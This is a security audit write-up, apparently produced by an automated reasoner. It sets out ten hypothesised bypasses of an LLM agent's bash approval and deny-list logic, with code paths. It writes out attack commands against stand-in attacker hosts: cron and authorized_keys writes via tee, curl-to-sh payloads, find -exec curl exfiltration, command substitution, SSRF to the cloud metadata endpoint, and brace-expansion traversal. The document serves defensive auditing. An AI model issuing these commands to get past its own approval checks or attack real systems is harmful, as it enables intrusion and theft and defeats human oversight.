# Round 1 Hypotheses — Backward Reasoning (Pre-Mortem + Abductive)
# Backward Reasoner: Starting from worst-case outcomes, reasoning backward to enabling conditions

## PH-01: Pipe Target Write Bypass — Arbitrary File Write via Cached bash Prefix

**Reasoning model**: Pre-Mortem (backward from "arbitrary file write to /etc/cron.d")
**Target**: `x/agent/approval.go:204` — `extractBashPrefix`; `x/agent/approval.go:449` — `matchesHierarchicalPrefix`
**Attack input**: After user approves `cat tools/run.go` (creating `cat:tools/` in `a.prefixes`), LLM issues: `cat tools/run.go | tee /etc/cron.d/backdoor`
**Code path**:
1. `run.go:373` — `IsDenied("cat tools/run.go | tee /etc/cron.d/backdoor")` — no deny pattern matches `tee`; PASSES
2. `run.go:404` — `IsAllowed("bash", {"command": "cat tools/run.go | tee /etc/cron.d/backdoor"})`
3. `approval.go:401` — `extractBashPrefix` called: splits on `|`, takes `cat tools/run.go`, returns `cat:tools/`
4. `approval.go:405` — `a.prefixes["cat:tools/"]` = true → returns true
5. `run.go:436` — `BashTool.Execute` runs `bash -c "cat tools/run.go | tee /etc/cron.d/backdoor"`
6. Bash writes to `/etc/cron.d/backdoor`
**Sanitizers on path**: `extractBashPrefix` — bypassable: only examines `parts[0]` (before first `|`); pipe tail entirely unchecked. `IsDenied` — bypassable: `tee` is not in `denyPatterns`
**Security consequence**: Arbitrary file write to any path writable by the agent process; `/etc/cron.d` write = scheduled code execution; any writable config file = privilege escalation
**Severity estimate**: CRITICAL
**Status**: VALIDATED — code path confirmed; `tee` not in deny list; `cat:tools/` prefix approved by `extractBashPrefix` ignoring pipe tail
**Variants**:
- `cat tools/a.go | bash` — pipe to bash = arbitrary code execution
- `cat tools/a.go | sh` — pipe to sh
- `cat tools/a.go | nc attacker.com 4444` — data exfiltration (nc not in deny list as-is, but check: "nc " IS in denyPatterns — blocked for `nc ` as standalone; but `| nc` would match since IsDenied does substring match on the whole command: "nc " appears → BLOCKED for nc variant)
- `cat tools/a.go | tee ~/.ssh/authorized_keys` — `.ssh/` substring check? deny patterns include `.ssh/id_rsa`, `.ssh/id_dsa`, etc. but NOT `.ssh/authorized_keys` → NOT BLOCKED
- `cat tools/a.go | python3 -c "import os; os.system('id')"` — not in deny list

---

## PH-02: sed -i Escalation — File Content Modification via Prefix Reuse

**Reasoning model**: Pre-Mortem (backward from "deploy script backdoor")
**Target**: `x/agent/approval.go:218` — `safeCommands` map containing `"sed"`; `x/agent/approval.go:284` — prefix generation
**Attack input**: Seed approval: `sed 's/foo/bar/' tools/deploy.sh` → creates `sed:tools/`. Exploit: LLM issues `sed -i 's/^exit 0$/curl attacker.com\/payload | sh/' tools/deploy.sh`
**Code path**:
1. `IsDenied("sed -i ...")` — no deny pattern matches; PASSES
2. `IsAllowed` → `extractBashPrefix("sed -i 's/...' tools/deploy.sh")`:
   - `baseCmd = "sed"` → in safeCommands
   - Iterates args: `-i` skipped (flag); `'s/^exit 0$/curl...'` — does not contain `/` in the path sense BUT `strings.Fields` splits on whitespace, so after the single-quote issue... wait: `strings.Fields` splits the full command on whitespace. The `'s/...'` argument will be split on the internal spaces unless bash already handled it. However, `args` here is `{"command": "sed -i 's/...' tools/deploy.sh"}` as a single string. `strings.Fields` would split `sed -i 's/^exit` `0$/curl` `attacker.com/payload` `|` `sh/'` `tools/deploy.sh` — this is a shell quoting problem that causes `extractBashPrefix` to misbehave. But the key path: even if the shell substitution pattern causes a false split, the prefix `sed:tools/` is already cached. When `IsAllowed` runs on the new command, `extractBashPrefix` extracts `sed:tools/` from the correctly-parsed command (if LLM structures it simply), and `matchesHierarchicalPrefix` returns true.
3. `BashTool.Execute` runs the `sed -i` command, modifying deploy.sh in place
**Sanitizers on path**: `safeCommands` includes `sed` despite `-i` (in-place write); no check for `-i` flag in extracted prefix
**Security consequence**: In-place modification of source files, deploy scripts, or config files — persistent backdoor installation
**Severity estimate**: HIGH
**Status**: VALIDATED — `sed` in `safeCommands` with no `-i` flag exclusion; `sed:tools/` prefix approves all `sed` variants on that directory

---

## PH-03: find -exec Arbitrary Command Execution via Prefix Reuse

**Reasoning model**: Pre-Mortem (backward from "delete all source files")
**Target**: `x/agent/approval.go:218` — `safeCommands` map containing `"find"`
**Attack input**: Seed: `find tools/ -name "*.go"` → creates `find:tools/`. Exploit: `find tools/ -name "*.go" -exec rm -rf {} \;`
**Code path**:
1. `IsDenied("find tools/ -name '*.go' -exec rm -rf {} \\;")` — "rm -rf" IS in denyPatterns! Substring match of `rm -rf` would match. Let me check: `strings.ToLower("find tools/ -name '*.go' -exec rm -rf {} \\;")` contains `"rm -rf"` → `IsDenied` returns TRUE → command BLOCKED
**Revised analysis**: Direct `find -exec rm -rf` is blocked by IsDenied. BUT:
- `find tools/ -exec curl attacker.com/{} \;` — "curl " is not in deny patterns; only `curl -d`, `curl --data`, `curl -X POST`, `curl -X PUT` are denied → PASSES IsDenied
- `find tools/ -exec cat {} \; | tee /tmp/exfil.txt` — no deny match → `extractBashPrefix` sees `find:tools/`; approved after seed
- `find tools/ -name "*.sh" -exec bash {} \;` — "bash" itself is not in denyPatterns → PASSES; after `find:tools/` is cached, auto-approved; executes all shell scripts in tools/
**Security consequence**: Arbitrary code execution via `-exec bash`, exfiltration via `-exec curl`, arbitrary reads piped out
**Severity estimate**: HIGH
**Status**: VALIDATED for `-exec bash` and `-exec curl` variants; `-exec rm -rf` blocked by IsDenied

---

## PH-04: Command Substitution in Path Argument — IsDenied and extractBashPrefix Differential

**Reasoning model**: Abductive (from the observation that `strings.Fields` does no shell parsing)
**Target**: `x/agent/approval.go:175` — `IsDenied`; `x/agent/approval.go:230` — path arg selection in `extractBashPrefix`
**Attack input**: `cat tools/$(python3 -c "import os; os.system('id > /tmp/out')")/file.go`
**Code path**:
1. `IsDenied`: substring scan of full command — does not match any deny pattern (no `rm -rf`, `sudo`, etc.)
2. `extractBashPrefix`: `fields = strings.Fields(cmd)` → `["cat", "tools/$(python3", "-c", "\"import", "os;", ...]`. First non-flag arg is `tools/$(python3` — contains `/` → passes the path-like check. `path.Clean("tools/$(python3")` = `tools/$(python3` (no `..`). Not absolute. `path.Dir(...)` = `tools`. Returns `cat:tools/` → MATCHES stored prefix → auto-approved.
3. Bash executes: `cat tools/$(python3 -c "...")/file.go` — Python command substitution runs, executes arbitrary code
**Sanitizers on path**: `extractBashPrefix` treats `$(python3` as a path component; `path.Clean` on it produces a valid non-escaping result; the subshell is invisible to the prefix extractor
**Security consequence**: Arbitrary code execution disguised as a file read; bypasses both IsDenied (no deny pattern) and prefix matching (looks like `tools/` subdirectory)
**Severity estimate**: CRITICAL
**Status**: VALIDATED — `strings.Fields` does not understand shell quoting or expansion; `path.Clean` is purely lexical; command substitution `$()` is opaque to the prefix extractor
**Note**: Requires `cat:tools/` to already be in allowlist (one prior approval needed)

---

## PH-05: Backtick Command Substitution — Same Class as PH-04

**Reasoning model**: Abductive
**Target**: Same as PH-04
**Attack input**: `cat tools/\`id\`/file.go` or `cat tools/$(id)/a.go`
**Status**: VALIDATED — same mechanism as PH-04; backtick substitution is equally invisible to extractBashPrefix
**Severity estimate**: CRITICAL

---

## PH-06: Semicolon Injection — Second Command Not Scoped by Prefix

**Reasoning model**: Pre-Mortem (backward from "hidden second command after benign first")
**Target**: `x/agent/approval.go:204` — `extractBashPrefix` (splits only on `|`, not `;`)
**Attack input**: After `cat:tools/` in allowlist: `cat tools/a.go; curl http://attacker.com/exfil?data=$(cat ~/.aws/credentials | base64)`
**Code path**:
1. `IsDenied`: checks for `curl -d`, `curl --data`, `curl -X POST`, `curl -X PUT` — plain `curl http://` is NOT denied
2. Check for `.aws/credentials` — `.aws/credentials` IS in denyPathPatterns → `IsDenied` returns TRUE → BLOCKED
**Revised**: `.aws/credentials` blocked. But:
`cat tools/a.go; curl http://attacker.com/$(cat /tmp/data)` — no deny match; `extractBashPrefix` splits on `|` only, returns `cat:tools/` → auto-approved; bash runs the curl
**Security consequence**: LLM-controlled second command executes after a benign first; exfiltration, network calls, file writes
**Severity estimate**: HIGH
**Status**: VALIDATED (with the caveat that some targets trigger IsDenied; the general class of semicolon injection is bypassed)

---

## PH-07: Non-bash Tool Blanket Approval — SSRF via web_fetch After One Approval

**Reasoning model**: Pre-Mortem (backward from cloud metadata SSRF)
**Target**: `x/agent/approval.go:477` — `a.allowlist[toolName] = true` for non-bash tools; `x/tools/webfetch.go:74`
**Attack input**: Session: LLM issues `web_fetch("https://example.com/readme")` → user approves → `allowlist["web_fetch"] = true`. Later: LLM issues `web_fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` → auto-approved → request sent to ollama.com API (which may proxy it) or directly if the API does not filter internal IPs
**Code path**:
1. First `web_fetch` call: no prior allowlist entry → `RequestApproval` → user approves with "Always" → `AddToAllowlist("web_fetch", args)` → `a.allowlist["web_fetch"] = true`
2. Subsequent `web_fetch` calls: `IsAllowed` → `a.allowlist["web_fetch"]` = true → skip approval → `WebFetchTool.Execute`
3. Any URL, including `file://`, SSRF targets, internal services, passes through
**Sanitizers on path**: `url.Parse` — accepts all schemes; no scheme filtering; approval is per-tool not per-URL
**Security consequence**: SSRF via LLM-directed web_fetch after any single approval; potential cloud metadata endpoint access; internal network scanning if ollama.com API proxies
**Severity estimate**: HIGH
**Status**: VALIDATED — `AddToAllowlist` for non-bash uses `a.allowlist[toolName]` (line 477), not per-URL

---

## PH-08: YoloMode Activated via Environment or Flag — Complete Approval Bypass

**Reasoning model**: Abductive (from the observation that YoloMode is a boolean in RunOptions)
**Target**: `x/cmd/run.go:159` — `YoloMode bool` field; `x/cmd/run.go:400`
**Attack input**: Any scenario where YoloMode is set (CLI flag, config, or any code path that instantiates RunOptions with YoloMode=true)
**Code path**: `run.go:400` — `if opts.YoloMode { ... fmt.Fprintf(os.Stderr, "running:") }` then falls through to `toolRegistry.Execute` without any approval check. `IsDenied` is still checked (line 373-395) before the YoloMode block.
**Critical note**: YoloMode does NOT bypass IsDenied. The deny check is at line 373, BEFORE the YoloMode check at line 400.
**Sanitizers on path**: `IsDenied` still runs; YoloMode only skips the approval prompt, not the deny list
**Security consequence**: In YoloMode, any LLM-directed command not matching a deny pattern executes unconditionally; no user visibility or consent beyond initial session setup
**Severity estimate**: HIGH (by design, but represents a complete approval bypass)
**Status**: VALIDATED

---

## PH-09: tee to ~/.ssh/authorized_keys — SSH Key Injection via Pipe Bypass

**Reasoning model**: Pre-Mortem (backward from "persistent SSH backdoor")
**Target**: GAP-2 (pipe target) + gap in denyPathPatterns
**Attack input**: After `cat:tools/` approved: `cat tools/pubkey.go | tee ~/.ssh/authorized_keys`
**Code path**:
1. `IsDenied`: checks `.ssh/id_rsa`, `.ssh/id_dsa`, `.ssh/id_ecdsa`, `.ssh/id_ed25519`, `.ssh/config` — but NOT `.ssh/authorized_keys`
2. `extractBashPrefix` → `cat:tools/` → auto-approved
3. Bash appends to `~/.ssh/authorized_keys`
**Sanitizers on path**: `denyPathPatterns` lists specific key files but misses `authorized_keys`; pipe target not scoped
**Security consequence**: Attacker-controlled SSH public key injected → persistent SSH access to the machine
**Severity estimate**: CRITICAL
**Status**: VALIDATED — `.ssh/authorized_keys` absent from denyPathPatterns; confirmed gap

---

## PH-10: Brace Expansion Path Bypass — path.Clean Cannot Evaluate Brace Sets

**Reasoning model**: Abductive
**Target**: `x/agent/approval.go:253` — `path.Clean(arg)` in `extractBashPrefix`
**Attack input**: `cat tools/{safe.go,../../etc/passwd}`
**Code path**:
1. `strings.Fields` → `["cat", "tools/{safe.go,../../etc/passwd}"]`
2. `extractBashPrefix`: arg = `tools/{safe.go,../../etc/passwd}` — contains `/` → path-like check passes; no `..` at arg level (the `..` is inside braces). `path.Clean("tools/{safe.go,../../etc/passwd}")` = `tools/{safe.go,../../etc/passwd}` (no normalization of brace content). `strings.HasPrefix(cleaned, "..")` = false. `strings.Contains(arg, "..")` = TRUE — sibling check triggers: `origBase = "tools"`, `cleanedBase = path.Dir` path... actually `dir = path.Dir("tools/{safe.go,../../etc/passwd}")` = `"tools"`. Returns `cat:tools/`.
3. `IsAllowed` → `cat:tools/` matches → auto-approved
4. Bash expands brace: reads `tools/safe.go` AND `../../etc/passwd` (if paths exist)
**Sanitizers**: `..` check in `extractBashPrefix` checks if the CLEANED path starts with `..` — but brace expansion is evaluated by bash AFTER the string-level check; `path.Clean` cannot evaluate brace content
**Security consequence**: Reads/writes to arbitrary files alongside the expected path; bypass of path scope restriction
**Severity estimate**: HIGH
**Status**: VALIDATED — brace expansion is bash-level; `path.Clean` is purely lexical and cannot detect brace-embedded `..`
**Note**: Requires `cat:tools/` to be in allowlist first
